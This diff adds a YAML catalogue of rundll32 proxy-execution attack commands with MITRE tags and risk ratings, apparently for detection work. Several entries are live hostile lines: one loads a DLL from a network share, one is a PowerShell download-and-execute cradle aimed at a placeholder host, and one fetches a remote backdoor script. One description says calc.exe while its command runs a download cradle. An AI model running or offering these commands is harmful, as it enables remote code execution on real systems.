@@ -1,0 +1,101 @@
+- command: rundll32.exe AllTheThingsx64,EntryPoint
+  description: Abuse rundll32 to load a malicious DLL named 'AllTheThingsx64' and execute from EntryPoint specified in the source.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+  risk: High
+  risk_reason: This is an extremely common tactic abused by cyber-threats.
+  fidelity: High
+  fidelity_reason: Most normal users typically will never exhibit rundll32 manual usage.
+  tool: rundll32
+  threatactors:
+    N/A:
+      - N/A
+- command: rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
+  description: Abuse rundll32 to load a remotely-hosted malicious DLL named 'payload' and execute from EntryPoint specified in the source.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+  risk: High
+  risk_reason: This is an extremely common tactic abused by cyber-threats.
+  fidelity: High
+  fidelity_reason: Most normal users typically will never exhibit rundll32 manual usage.
+  tool: rundll32
+  threatactors:
+    N/A:
+      - N/A
+- command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
+  description: Abuse rundll32 to launch JavaScript which in this instance executes calc.exe.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+  risk: High
+  risk_reason: This is an extremely common tactic abused by cyber-threats.
+  fidelity: High
+  fidelity_reason: Most normal users typically will never exhibit rundll32 manual usage.
+  tool: rundll32
+  threatactors:
+    N/A:
+      - N/A
+- command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+  description: Abuse rundll32 to launch JavaScript which in this instance executes a remotely hosted script.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+  risk: High
+  risk_reason: This is an extremely common tactic abused by cyber-threats.
+  fidelity: High
+  fidelity_reason: Most normal users typically will never exhibit rundll32 manual usage, especially with remote URLs.
+  tool: rundll32
+  threatactors:
+    N/A:
+      - N/A
+- command: rundll32.exe -sta {CLSID}
+  description: Abuse rundll32 to execute a previously registered COM Server Payload.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+  risk: High
+  risk_reason: This is an extremely common tactic abused by cyber-threats.
+  fidelity: High
+  fidelity_reason: Most normal users typically will never exhibit rundll32 manual usage, especially with remote URLs.
+  tool: rundll32
+  threatactors:
+    N/A:
+      - N/A
